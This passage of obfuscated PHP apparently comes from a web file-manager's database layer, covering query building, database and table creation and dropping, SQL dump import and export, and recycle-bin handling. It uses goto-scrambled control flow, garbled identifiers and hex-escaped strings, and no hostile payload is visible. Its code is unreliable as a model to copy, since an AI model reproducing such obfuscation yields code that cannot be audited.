$this->parseBind(!empty($DØ£é—ÙΩú[$C˜·’»ê¬‰[279]]) ? $DØ£é—ÙΩú[$C˜·’»ê¬‰[279]] : array())); goto E›«ôÍ‡¬û; C≠∞≥·Ù€∞: $C˜·’»ê¬‰ =& $_SERVER[Æ¡î¢≠¯™]; $this->model = $DØ£é—ÙΩú[$C˜·’»ê¬‰[275]]; if (is_string($aòŒ÷¬Ö ±)) { $aòŒ÷¬Ö ± = explode($C˜·’»ê¬‰[47], $aòŒ÷¬Ö ±); } goto AÒôõı©‚á; AÒôõı©‚á: array_walk($aòŒ÷¬Ö ±, array($this, $C˜·’»ê¬‰[805])); $cﬁÂ–ùÃ÷æ = $C˜·’»ê¬‰[941] . $this->parseTable($a™≈”Ó•Êõ) . $C˜·’»ê¬‰[802] . implode($C˜·’»ê¬‰[47], $aòŒ÷¬Ö ±) . $C˜·’»ê¬‰[920]; $cﬁÂ–ùÃ÷æ .= $this->buildSelectSql($DØ£é—ÙΩú); goto fÖäïÖ®ŒÈ; E›«ôÍ‡¬û: } public function update($AÓÆîﬁ–ú‘, $AÚÕ‘òáªô) { $Eπîﬁÿ¢»¯ =& $_SERVER[Æ¡î¢≠¯™]; $this->model = $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[275]]; $D´ìóç°Öë = $Eπîﬁÿ¢»¯[942] . $this->parseTable($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[273]]) . $this->parseSet($AÓÆîﬁ–ú‘) . $this->parseWhere(!empty($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[269]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[269]] : $Eπîﬁÿ¢»¯[33]) . $this->parseOrder(!empty($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[356]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[356]] : $Eπîﬁÿ¢»¯[33]) . $this->parseLimit(!empty($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[286]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[286]] : $Eπîﬁÿ¢»¯[33]) . $this->parseLock(isset($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[762]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[762]] : !1) . $this->parseComment(!empty($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[347]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[347]] : $Eπîﬁÿ¢»¯[33]); return $this->execute($D´ìóç°Öë, $this->parseBind(!empty($AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[279]]) ? $AÚÕ‘òáªô[$Eπîﬁÿ¢»¯[279]] : array())); } public function delete($d±ÇÇ‡ÖÑ÷ = array()) { $fä†∏”¿ÏÆ =& $_SERVER[Æ¡î¢≠¯™]; $this->model = $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[275]]; $c˜¥µì–ç™ = $fä†∏”¿ÏÆ[943] . $this->parseTable($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[273]]) . $this->parseWhere(!empty($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[269]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[269]] : $fä†∏”¿ÏÆ[33]) . $this->parseOrder(!empty($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[356]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[356]] : $fä†∏”¿ÏÆ[33]) . $this->parseLimit(!empty($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[286]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[286]] : $fä†∏”¿ÏÆ[33]) . $this->parseLock(isset($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[762]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[762]] : !1) . $this->parseComment(!empty($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[347]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[347]] : $fä†∏”¿ÏÆ[33]); return $this->execute($c˜¥µì–ç™, $this->parseBind(!empty($d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[279]]) ? $d±ÇÇ‡ÖÑ÷[$fä†∏”¿ÏÆ[279]] : array())); } public function select($F◊Ÿ©áÑº¬ = array()) { goto A–Üö€ƒ¥É; A–Üö€ƒ¥É: $c ®˘ä‘¥á =& $_SERVER[Æ¡î¢≠¯™]; $this->model = $F◊Ÿ©áÑº¬[$c ®˘ä‘¥á[275]]; $c¨Ø« ´õ∑ = $this->buildSelectSql($F◊Ÿ©áÑº¬); goto b˜Û‹ä‹âÖ; b˜Û‹ä‹âÖ: $DÌé´óÙØ‚ = isset($F◊Ÿ©áÑº¬[$c ®˘ä‘¥á[343]]) ? $F◊Ÿ©áÑº¬[$c ®˘ä‘¥á[343]] : !1; if ($DÌé´óÙØ‚) { $dŒ—Ê«Ì®â = is_string($DÌé´óÙØ‚[$c ®˘ä‘¥á[99]]) ? $DÌé´óÙØ‚[$c ®˘ä‘¥á[99]] : $c ®˘ä‘¥á[944] . md5($c¨Ø« ´õ∑); $B©·ö÷õ–ı = think_cache($dŒ—Ê«Ì®â, $c ®˘ä‘¥á[33], $DÌé´óÙØ‚); if (!1 !== $B©·ö÷õ–ı) { return $B©·ö÷õ–ı; } } $Eÿñ∫ó‘º‰ = $this->query($c¨Ø« ´õ∑, $this->parseBind(!empty($F◊Ÿ©áÑº¬[$c ®˘ä‘¥á[279]]) ? $F◊Ÿ©áÑº¬[$c ®˘ä‘¥á[279]] : array())); goto CÂıÙ å„˘; CÂıÙ å„˘: if ($DÌé´óÙØ‚ && !1 !== $Eÿñ∫ó‘º‰) { think_cache($dŒ—Ê«Ì®â, $Eÿñ∫ó‘º‰, $DÌé´óÙØ‚); } return $Eÿñ∫ó‘º‰; goto dõéï¯ãõŒ; dõéï¯ãõŒ: } public function buildSelectSql($F«”›‰‘Õ€ = array()) { goto aóıìƒ÷Ò¯; aóıìƒ÷Ò¯: $AØˆÜ…‰∫è =& $_SERVER[Æ¡î¢≠¯™]; if (isset($F«”›‰‘Õ€[$AØˆÜ…‰∫è[346]])) { if (strpos($F«”›‰‘Õ€[$AØˆÜ…‰∫è[346]], $AØˆÜ…‰∫è[47])) { list($F¿—Ωçë„È, $A ƒ⁄Òè∂§) = explode($AØˆÜ…‰∫è[47], $F«”›‰‘Õ€[$AØˆÜ…‰∫è[346]]); } else { $F¿—Ωçë„È = $F«”›‰‘Õ€[$AØˆÜ…‰∫è[346]]; } $F¿—Ωçë„È = $F¿—Ωçë„È ? $F¿—Ωçë„È : 1; $A ƒ⁄Òè∂§ = isset($A ƒ⁄Òè∂§) ? $A ƒ⁄Òè∂§ : (is_numeric($F«”›‰‘Õ€[$AØˆÜ…‰∫è[286]]) ? $F«”›‰‘Õ€[$AØˆÜ…‰∫è[286]] : 20); $cªï’©∑åó = $A ƒ⁄Òè∂§ * ((int) $F¿—Ωçë„È - 1); $F«”›‰‘Õ€[$AØˆÜ…‰∫è[286]] = $cªï’©∑åó . $AØˆÜ…‰∫è[47] . $A ƒ⁄Òè∂§; } if (think_config($AØˆÜ…‰∫è[945])) { $c∞’Çºó¿º = $AØˆÜ…‰∫è[946] . md5(serialize($F«”›‰‘Õ€)); $E–âààŒßÙ = think_cache($c∞’Çºó¿º); if ($E–âààŒßÙ) { return $E–âààŒßÙ; } } goto cî∫ãê∂’Ì; FŸåü¿ùô˘: return $c†ü¿ìãÓ€; goto cúœô˜¯›æ; cî∫ãê∂’Ì: $c†ü¿ìãÓ€ = $this->parseSql($this->selectSql, $F«”›‰‘Õ€); $c†ü¿ìãÓ€ .= $this->parseLock(isset($F«”›‰‘Õ€[$AØˆÜ…‰∫è[762]]) ? $F«”›‰‘Õ€[$AØˆÜ…‰∫è[762]] : !1); if (isset($c∞’Çºó¿º)) { think_cache($c∞’Çºó¿º, $c†ü¿ìãÓ€); } goto FŸåü¿ùô˘; cúœô˜¯›æ: } public function parseSql($eÎÙ‰àÆœ∂, $D¿ÔÙ÷ß»ñ = array()) { $dﬂ‰∫ÈŸŒ¢ =& $_SERVER[Æ¡î¢≠¯™]; $eÎÙ‰àÆœ∂ = str_replace(array($dﬂ‰∫ÈŸŒ¢[947], $dﬂ‰∫ÈŸŒ¢[948], $dﬂ‰∫ÈŸŒ¢[949], $dﬂ‰∫ÈŸŒ¢[950], $dﬂ‰∫ÈŸŒ¢[951], $dﬂ‰∫ÈŸŒ¢[952], $dﬂ‰∫ÈŸŒ¢[953], $dﬂ‰∫ÈŸŒ¢[954], $dﬂ‰∫ÈŸŒ¢[955], $dﬂ‰∫ÈŸŒ¢[956], $dﬂ‰∫ÈŸŒ¢[957]), array($this->parseTable("{$D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[273]]}"), $this->parseDistinct(isset($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[958]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[958]] : !1), $this->parseField(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[267]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[267]] : $dﬂ‰∫ÈŸŒ¢[183]), $this->parseJoin(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[276]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[276]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseWhere(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[269]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[269]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseGroup(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[959]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[959]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseHaving(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[960]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[960]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseOrder(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[356]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[356]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseLimit(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[286]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[286]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseUnion(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[341]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[341]] : $dﬂ‰∫ÈŸŒ¢[33]), $this->parseComment(!empty($D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[347]]) ? $D¿ÔÙ÷ß»ñ[$dﬂ‰∫ÈŸŒ¢[347]] : $dﬂ‰∫ÈŸŒ¢[33])), $eÎÙ‰àÆœ∂); return $eÎÙ‰àÆœ∂; } public function getLastSql($Eﬂ¿ˆ»Á∑⁄ = '') { return $Eﬂ¿ˆ»Á∑⁄ ? $this->modelSql[$Eﬂ¿ˆ»Á∑⁄] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Dëºó§›ìÔ) { return addslashes($Dëºó§›ìÔ); } public function setModel($Dı‚ﬂ‚£Á¶) { $this->model = $Dı‚ﬂ‚£Á¶; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Eµ’®°ä≥ù, $E•‹ÉÌéíì = '') { $this->database = $Eµ’®°ä≥ù; $this->type = $E•‹ÉÌéíì; } public function model($aÉ©ù£Ã’‡ = '') { return new ModelBase($aÉ©ù£Ã’‡, $_SERVER[Æ¡î¢≠¯™][33], $this->database); } public function db($bÉ≤Àø¯ºé = false) { goto CŸÁ≥∆ÈúÉ; a¿≠¬·∂πı: $this->database = $BÑ∂»éÁí⁄; $e≠ÉÜ›úÉå->execute("\x75\163\145\40\140{$F¿ıÜ¯Àµ—}\x60"); return $e≠ÉÜ›úÉå; goto d‹ç≤âÛõÆ; Fı⁄∏¿è∏ˆ: $this->database = $BÑ∂»éÁí⁄; $e≠ÉÜ›úÉå = $this->model()->db(); $B±ÈÎ û‰é = $e≠ÉÜ›úÉå->execute("\x73\150\157\167\x20\144\141\164\x61\142\141\x73\145\x73\x20\x6c\x69\x6b\x65\40\47{$F¿ıÜ¯Àµ—}\x27"); goto BªØâˆ§Ã€; BªØâˆ§Ã€: if (!$B±ÈÎ û‰é) { $e≠ÉÜ›úÉå->execute("\143\162\145\x61\164\145\40\x64\141\x74\141\142\x61\x73\x65\x20\140{$F¿ıÜ¯Àµ—}\x60"); } $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[240]] = $F¿ıÜ¯Àµ—; if ($BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[876]] == $CÛ•˜∏¬åá[716]) { $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[875]] .= $CÛ•˜∏¬åá[961] . $F¿ıÜ¯Àµ—; } goto a¿≠¬·∂πı; CŸÁ≥∆ÈúÉ: $CÛ•˜∏¬åá =& $_SERVER[Æ¡î¢≠¯™]; $BÑ∂»éÁí⁄ = $this->database; if ($this->type == $CÛ•˜∏¬åá[9] || !$bÉ≤Àø¯ºé) { return $this->model()->db(); } goto a’Á‰ÁÔ¬˜; a’Á‰ÁÔ¬˜: $F¿ıÜ¯Àµ— = $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[240]]; $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[240]] = $CÛ•˜∏¬åá[33]; if ($BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[876]] == $CÛ•˜∏¬åá[716]) { $Aõ≥◊±‰ÒÚ = $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[875]]; $BÑ∂»éÁí⁄[$CÛ•˜∏¬åá[875]] = substr($Aõ≥◊±‰ÒÚ, 0, strrpos($Aõ≥◊±‰ÒÚ, $CÛ•˜∏¬åá[961])); } goto Fı⁄∏¿è∏ˆ; d‹ç≤âÛõÆ: } public function createTable($A¯ˆÔ™‡¯ﬂ, $CÊûêÓ´‚‘ = null) { $C⁄®ÇªÁ—æ =& $_SERVER[Æ¡î¢≠¯™]; if (!IO::exist($A¯ˆÔ™‡¯ﬂ)) { show_json(LNG($C⁄®ÇªÁ—æ[962]), !1); } $Bòπ¬éæ∫∞ = sqlSplit(IO::getContent($A¯ˆÔ™‡¯ﬂ)); foreach ($Bòπ¬éæ∫∞ as $cëœ— ·äˆ) { if ($CÊûêÓ´‚‘) { $EË∂âá≤›¨ = stripos($cëœ— ·äˆ, $C⁄®ÇªÁ—æ[963]) === 0; if ($EË∂âá≤›¨) { $CÊûêÓ´‚‘->task[$C⁄®ÇªÁ—æ[964]] += 1; } } $this->model()->db()->execute($cëœ— ·äˆ); if ($CÊûêÓ´‚‘ && $EË∂âá≤›¨) { $f‰·ß¥∫ ñ = $C⁄®ÇªÁ—æ[965]; preg_match($f‰·ß¥∫ ñ, $cëœ— ·äˆ, $B∆øÍŒ¡ïè); $CÊûêÓ´‚‘->task[$C⁄®ÇªÁ—æ[966]] = trim($Aöéºöãπê[0], $C⁄®ÇªÁ—æ[811]); $CÊûêÓ´‚‘->update(1); } } $this->taskToCache($CÊûêÓ´‚‘); } public function insertTable($A’◊†·îÁÿ, $c–â”›ÔœÑ = null) { $Cºô∂©—•≥ =& $_SERVER[Æ¡î¢≠¯™]; foreach ($A’◊†·îÁÿ as $A≈öô¨»»Ò) { $Dæ‰¢ñ—ß = basename($A≈öô¨»»Ò); $Dæ‰¢ñ—ß = substr($Dæ‰¢ñ—ß, 0, strrpos($Dæ‰¢ñ—ß, $Cºô∂©—•≥[103])); if ($c–â”›ÔœÑ) { $c–â”›ÔœÑ->task[$Cºô∂©—•≥[966]] = $Dæ‰¢ñ—ß; } if (get_filesize($A≈öô¨»»Ò) == 0) { continue; } $f√Û´ƒ«Íº = $this->sqlToDb($A≈öô¨»»Ò, $c–â”›ÔœÑ); if (!$f√Û´ƒ«Íº) { show_json(LNG($Cºô∂©—•≥[967]) . "\x5b{$Dæ‰¢ñ—ß}\x5d", !1); } } $this->taskToCache($c–â”›ÔœÑ); } public function sqlFromDb($F∂–¡ÉÜˆô, $EÜÂãª—Ç≤, $a∂ì˘Ÿî⁄Ï = null, $Fçî⁄ÁÙ§° = null) { goto aàï√ôÖö¢; EÏË¡ª∏Ñé: $d•ú¯à¯ç® = 1; $b¨Ó©ØæÎ = 500; $DæÚà—˜è– = fopen($EÜÂãª—Ç≤, $_SERVER[Æ¡î¢≠¯™][968]); goto CÜÁûœË–√; aàï√ôÖö¢: if ($a∂ì˘Ÿî⁄Ï) { $a∂ì˘Ÿî⁄Ï->task[$_SERVER[Æ¡î¢≠¯™][966]] = $F∂–¡ÉÜˆô; } $Cö€à‘à›ä = $this->model($F∂–¡ÉÜˆô); $aﬁ∞≥…Îó∆ = 0; goto EÏË¡ª∏Ñé; CÜÁûœË–√: $A™≤°⁄Õˆ⁄ = $Cö€à‘à›ä->getPk(); $b§ﬂ‡òµ·È = $Cö€à‘à›ä->getDbFields(); do { $f“Ø⁄Ëãöñ = $Cö€à‘à›ä->field($b§ﬂ‡òµ·È)->order($A™≤°⁄Õˆ⁄ . $_SERVER[Æ¡î¢≠¯™][969])->selectPage($b¨Ó©ØæÎ, $d•ú¯à¯ç®); $D⁄…√£ºŒÓ = !empty($f“Ø⁄Ëãöñ[$_SERVER[Æ¡î¢≠¯™][360]]) ? $f“Ø⁄Ëãöñ[$_SERVER[Æ¡î¢≠¯™][360]] : array(); if (!($Cºﬂ¯∏ñˆÛ = count($D⁄…√£ºŒÓ))) { break; } if ($a∂ì˘Ÿî⁄Ï) { $a∂ì˘Ÿî⁄Ï->task[$_SERVER[Æ¡î¢≠¯™][964]] += $Cºﬂ¯∏ñˆÛ; } $aÜ´É∑Òó∂ = array(); foreach ($D⁄…√£ºŒÓ as $B¿Í¡ƒôéà) { if ($Fçî⁄ÁÙ§°) { $B¿Í¡ƒôéà[$_SERVER[Æ¡î¢≠¯™][85]] = "\173\151\x6f\72{$Fçî⁄ÁÙ§°}\x7d" . substr($B¿Í¡ƒôéà[$_SERVER[Æ¡î¢≠¯™][85]], strlen("\173\x69\x6f\x3a{$B¿Í¡ƒôéà[$_SERVER[Æ¡î¢≠¯™][735]]}\x7d")); $B¿Í¡ƒôéà[$_SERVER[Æ¡î¢≠¯™][735]] = $Fçî⁄ÁÙ§°; } $aÜ´É∑Òó∂[] = $_SERVER[Æ¡î¢≠¯™][970] . $this->sqlEncode($B¿Í¡ƒôéà) . $_SERVER[Æ¡î¢≠¯™][971]; } $A∞Û¥È±èá = "\111\x4e\123\105\122\x54\x20\111\116\124\x4f\40\140{$F∂–¡ÉÜˆô}\140\40\50\140" . implode($_SERVER[Æ¡î¢≠¯™][972], $b§ﬂ‡òµ·È) . $_SERVER[Æ¡î¢≠¯™][973]; fwrite($DæÚà—˜è–, $A∞Û¥È±èá . implode($_SERVER[Æ¡î¢≠¯™][974], $aÜ´É∑Òó∂) . $_SERVER[Æ¡î¢≠¯™][77] . PHP_EOL); $d•ú¯à¯ç®++; $aﬁ∞≥…Îó∆ += $Cºﬂ¯∏ñˆÛ; if ($a∂ì˘Ÿî⁄Ï) { $a∂ì˘Ÿî⁄Ï->update($Cºﬂ¯∏ñˆÛ); } } while ($Cºﬂ¯∏ñˆÛ == $b¨Ó©ØæÎ); goto b‹Ê»ﬂÑ©Ç; b‹Ê»ﬂÑ©Ç: fclose($DæÚà—˜è–); return $aﬁ∞≥…Îó∆; goto BÌç±Ÿ˜ãÖ; BÌç±Ÿ˜ãÖ: } public function sqlToDb($Fâ©÷â∆‡ì, $EÒäƒ·˜ñ≈ = null) { goto bëŒªïª©ª; bëŒªïª©ª: $AÓùÿÉÇÒå =& $_SERVER[Æ¡î¢≠¯™]; $D¥€∆Öáå† = $this->model()->db(); $fçäÉñ‡ú = @fopen($Fâ©÷â∆‡ì, $AÓùÿÉÇÒå[975]); goto e∫≠ü´ñ”á; DÈìıá≥®«: $b’ÿË±™∏» = 500 + 1; while (!feof($fçäÉñ‡ú)) { if ($EÒäƒ·˜ñ≈ && $B√ÑÜ±Öàõ != 0) { $EÒäƒ·˜ñ≈->task[$AÓùÿÉÇÒå[964]] += 1; } $B√ÑÜ±Öàõ++; $E¶Î—µÊ”˘ = trim(fgets($fçäÉñ‡ú)); $B©£êÌàπØ .= $AÓùÿÉÇÒå[50] . $this->sqlDecode($E¶Î—µÊ”˘, $this->type); if ($B√ÑÜ±Öàõ == $b’ÿË±™∏») { $B©£êÌàπØ = rtrim(trim($B©£êÌàπØ), $AÓùÿÉÇÒå[77]); if (!$D¥€∆Öáå†->execute($B©£êÌàπØ)) { return !1; } if ($EÒäƒ·˜ñ≈) { $EÒäƒ·˜ñ≈->update($B√ÑÜ±Öàõ - 1); } $B©£êÌàπØ = $AÓùÿÉÇÒå[33]; $B√ÑÜ±Öàõ = 0; } } fclose($fçäÉñ‡ú); goto FÈ‡ΩÑŒ≥Ï; FÈ‡ΩÑŒ≥Ï: if ($B©£êÌàπØ) { $B©£êÌàπØ = rtrim(trim($B©£êÌàπØ), $AÓùÿÉÇÒå[77]); if (!$D¥€∆Öáå†->execute($B©£êÌàπØ)) { return !1; } if ($EÒäƒ·˜ñ≈) { $EÒäƒ·˜ñ≈->update($B√ÑÜ±Öàõ - 1); } } return !0; goto F˜ÚÉëÛÃè; e∫≠ü´ñ”á: if (!$fçäÉñ‡ú) { return !1; } $B√ÑÜ±Öàõ = 0; $B©£êÌàπØ = $AÓùÿÉÇÒå[33]; goto DÈìıá≥®«; F˜ÚÉëÛÃè: } public function dropTable($eú¶Œ£€‡È = null) { $Aã‹Ü¡é∆„ = $this->model()->db(); $eêŸ∏ø£íä = $eú¶Œ£€‡È ? array($eú¶Œ£€‡È) : $Aã‹Ü¡é∆„->getTables(); if (!$eêŸ∏ø£íä) { return; } foreach ($eêŸ∏ø£íä as $eú¶Œ£€‡È) { $Aã‹Ü¡é∆„->execute("\x64\162\x6f\x70\x20\164\141\142\x6c\145\40\x69\146\40\145\x78\151\x73\164\163\x20\x60{$eú¶Œ£€‡È}\x60"); } } private function taskToCache($fÉ¿≤Ô…›π = null) { $d≈ÖäÍπàˆ =& $_SERVER[Æ¡î¢≠¯™]; if (!$fÉ¿≤Ô…›π) { return; } $D∆ä—Ãû∏∫ = array($d≈ÖäÍπàˆ[966] => $fÉ¿≤Ô…›π->task[$d≈ÖäÍπàˆ[966]], $d≈ÖäÍπàˆ[964] => $fÉ¿≤Ô…›π->task[$d≈ÖäÍπàˆ[964]], $d≈ÖäÍπàˆ[976] => $fÉ¿≤Ô…›π->task[$d≈ÖäÍπàˆ[976]]); if ($D∆ä—Ãû∏∫[$d≈ÖäÍπàˆ[964]] == $D∆ä—Ãû∏∫[$d≈ÖäÍπàˆ[976]]) { $D∆ä—Ãû∏∫[$d≈ÖäÍπàˆ[688]] = 1; } Cache::set($d≈ÖäÍπàˆ[977] . $fÉ¿≤Ô…›π->task[$d≈ÖäÍπàˆ[372]], $D∆ä—Ãû∏∫); $fÉ¿≤Ô…›π->end(); } private function sqlEncode($CÒ§ÜÒ£®‹) { $có¬ÁﬂÏ¨≈ =& $_SERVER[Æ¡î¢≠¯™]; $Dú∆¡”≈áå = array(); foreach ($CÒ§ÜÒ£®‹ as $cöäıî©ŒÕ) { if (is_array($cöäıî©ŒÕ)) { $cöäıî©ŒÕ = json_encode_force($cöäıî©ŒÕ); } $cöäıî©ŒÕ = addslashes($cöäıî©ŒÕ); $cöäıî©ŒÕ = str_replace(array($có¬ÁﬂÏ¨≈[978], $có¬ÁﬂÏ¨≈[62]), array($có¬ÁﬂÏ¨≈[979], $có¬ÁﬂÏ¨≈[980]), $cöäıî©ŒÕ); $Dú∆¡”≈áå[] = str_replace($có¬ÁﬂÏ¨≈[55], $có¬ÁﬂÏ¨≈[981], $cöäıî©ŒÕ); } return $có¬ÁﬂÏ¨≈[55] . implode($có¬ÁﬂÏ¨≈[982], $Dú∆¡”≈áå) . $có¬ÁﬂÏ¨≈[55]; } private function sqlDecode($BËëÈäÇ‡ø, $f’„ãÚ’’º) { $C≈ÌªçÂº… =& $_SERVER[Æ¡î¢≠¯™]; $BËëÈäÇ‡ø = str_replace(array($C≈ÌªçÂº…[979], $C≈ÌªçÂº…[980]), array($C≈ÌªçÂº…[978], $C≈ÌªçÂº…[62]), $BËëÈäÇ‡ø); if ($f’„ãÚ’’º == $C≈ÌªçÂº…[9]) { $BËëÈäÇ‡ø = stripslashes($BËëÈäÇ‡ø); } return $BËëÈäÇ‡ø; } } goto fıÁ÷Ñë¬; cﬂ“òá£Â≤: define($_SERVER[Æ¡î¢≠¯™][235], 1); define($_SERVER[Æ¡î¢≠¯™][236], 0); define($_SERVER[Æ¡î¢≠¯™][237], 2); goto B’√√¨–†ø; cÜ•ÿ≈ØÈã: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\143\x65\137\x72\x65\x63\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\x54\151\155\145", "\164\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\146\165\156\143\164\151\157\x6e")); public function listData($E ïèÜ·∫ = false) { $cÌ˘•îß‚ä =& $_SERVER[Æ¡î¢≠¯™]; $E ïèÜ·∫ = $E ïèÜ·∫ ? $E ïèÜ·∫ : USER_ID; $E≥È à±¬ø = $this->where(array($cÌ˘•îß‚ä[1388] => $E ïèÜ·∫))->select(); return array_to_keyvalue($E≥È à±¬ø, $cÌ˘•îß‚ä[33], $cÌ˘•îß‚ä[374]); } public function moveToRecycle($E°óæÎ‘É”) { goto aâÇóÒπ®ë; f¯π¯†«ﬁ’: $this->recycleMove($E°óæÎ‘É”, 1); if ($DóÙäî¶≥Œ[$aÛßàÌÏ—[375]] == $aÛßàÌÏ—[93]) { $dÃù¡¬°æª = array($aÛßàÌÏ—[529] => array($aÛßàÌÏ—[487], $DóÙäî¶≥Œ[$aÛßàÌÏ—[463]] . $E°óæÎ‘É” . $aÛßàÌÏ—[488])); $eå≈◊∂âç…->where($dÃù¡¬°æª)->setField($aÛßàÌÏ—[401], 1); } goto dù£≤–ˆèå; aâÇóÒπ®ë: $aÛßàÌÏ— =& $_SERVER[Æ¡î¢≠¯™]; $eå≈◊∂âç… = Model($aÛßàÌÏ—[1096]); $DóÙäî¶≥Œ = $eå≈◊∂âç…->sourceInfo($E°óæÎ‘É”); goto AÍàØ–ä√§; AÍàØ–ä√§: if (!$DóÙäî¶≥Œ || $DóÙäî¶≥Œ[$aÛßàÌÏ—[401]] == $aÛßàÌÏ—[93]) { return; } $cö¬ë«—∆∆ = array($aÛßàÌÏ—[388] => $E°óæÎ‘É”, $aÛßàÌÏ—[1388] => USER_ID, $aÛßàÌÏ—[525] => $DóÙäî¶≥Œ[$aÛßàÌÏ—[376]], $aÛßàÌÏ—[526] => $DóÙäî¶≥Œ[$aÛßàÌÏ—[460]], $aÛßàÌÏ—[529] => $DóÙäî¶≥Œ[$aÛßàÌÏ—[463]]); $this->add($cö¬ë«—∆∆); goto f¯π¯†«ﬁ’; dù£≤–ˆèå: } public function clear() { $this->remove(!1); } public function remove($fèµû™´©à = false) { goto Fó™ﬁÇáµ£; Fó™ﬁÇáµ£: $Eë∞œé±πÀ =& $_SERVER[Æ¡î¢≠¯™]; $Cï∆•Ù¢›ú = Model($Eë∞œé±πÀ[1096]); $AïÂ√•’¯† = $this->listData(); goto Cëß‡¯ÇëÇ; dÑ•◊ßêΩ’: foreach ($CÛÉáñ™∂ˆ as $Eò∞Ò™›¶) { $Cï∆•Ù¢›ú->targetSpaceUpdate($Eò∞Ò™›¶[$Eë∞œé±πÀ[376]], $Eò∞Ò™›¶[$Eë∞œé±πÀ[460]]); } goto c∏éƒﬂÔÌΩ; Cëß‡¯ÇëÇ: $fèµû™´©à = $fèµû™´©à === !1 ? !1 : $fèµû™´©à; $CÛÉáñ™∂ˆ = array(); foreach ($AïÂ√•’¯† as $E¡»ñ‡¥∫˜) { if ($fèµû™´©à != !1 && !in_array($E¡»ñ‡¥∫˜, $fèµû™´©à)) { continue; } $Cï∆•Ù¢›ú->remove($E¡»ñ‡¥∫˜, !1); $DûÎ´¡√ÜÈ = $this->where(array($Eë∞œé±πÀ[374] => $E¡»ñ‡¥∫˜))->find(); $féøŒô‡¿π = $DûÎ´¡√ÜÈ[$Eë∞œé±πÀ[376]] . $Eë∞œé±πÀ[80] . $DûÎ´¡√ÜÈ[$Eë∞œé±πÀ[460]]; $CÛÉáñ™∂ˆ[$féøŒô‡¿π] = array($Eë∞œé±πÀ[525] => $DûÎ´¡√ÜÈ[$Eë∞œé±πÀ[376]], $Eë∞œé±πÀ[460] => $DûÎ´¡√ÜÈ[$Eë∞œé±πÀ[460]]); $this->where(array($Eë∞œé±πÀ[374] => $E¡»ñ‡¥∫˜))->delete(); } goto dÑ•◊ßêΩ’; c∏éƒﬂÔÌΩ: } public function restore($cèÚã⁄áÂ√ = false) { 